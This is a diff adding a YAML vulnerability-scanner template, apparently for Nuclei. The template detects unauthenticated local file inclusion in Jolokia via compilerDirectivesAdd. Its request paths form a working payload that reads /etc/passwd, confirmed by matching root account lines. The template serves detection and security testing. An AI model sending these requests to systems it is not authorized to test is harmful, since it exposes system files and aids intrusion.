@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - condition: and
+    regex:
+    - 'root:.*:0:0:'
+    - compilerDirectivesAdd
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+  - '{{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
+  stop-at-first-match: true
+id: jolokia-unauthenticated-lfi
+info:
+  author: dhiyaneshDk
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.
+  metadata:
+    max-request: 2
+  name: Jolokia - Local File Inclusion
+  reference:
+  - https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/
+  - https://github.com/laluka/jolokia-exploitation-toolkit
+  severity: high
+  tags: jolokia,springboot,tomcat,lfi,misconfig
